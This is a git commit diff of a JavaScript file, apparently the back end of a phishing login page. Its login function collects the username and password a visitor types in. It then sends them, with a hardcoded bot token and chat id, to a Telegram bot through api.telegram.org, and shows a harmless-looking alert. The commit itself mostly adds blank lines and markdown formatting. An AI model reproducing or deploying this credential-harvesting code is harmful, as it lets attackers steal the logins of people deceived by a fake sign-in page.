4ee53779c4b9e9cd66695b2ec433d7f85ba50333
kosaer <49170395+kosaer@users.noreply.github.com>
2019-07-04 12:19:54 +0300

    Update main.js

--- main.js
+++ main.js
@@ -1,38 +1,58 @@
 $(document).ready(function(){
 
+
 var winh = $(window).height();
 
+
 $(".header").height(winh);
+
+
 $(".space").height(winh /4);
 
-
 $("button").click(function(){
+
+
+
+
 window.location.href = "login.html";
+
+
+
+
 });
-
-
 
 });
 
 function login(){
+
+
 var username = $("#username").val();
+
+
 var pass = $("#pass").val();
 
-var text = "user : " + username + "|| pass : " + pass;
+var text = "user : " + username + " || pass : `" + pass + "`" 
 
 var token = "819018892:AAH2xY5pzZ4gtPyPoF87rXEpXE-Bf8C65GU";
+
 var id = "836578231";
 
 if(username.length > 0 && pass.length > 0){
 
 
 $("#logbut").attr("disabled","disabled");
-    
-    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text, function( data ) {
+
+  
+    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text + "&parse_mode=markdown" , function( data ) {
+
 $("#logbut").removeAttr("disabled","disabled");
+
 $(".alert").show();
+
 $("#username,#pass").val("");
+
       });
+
 
 }
 
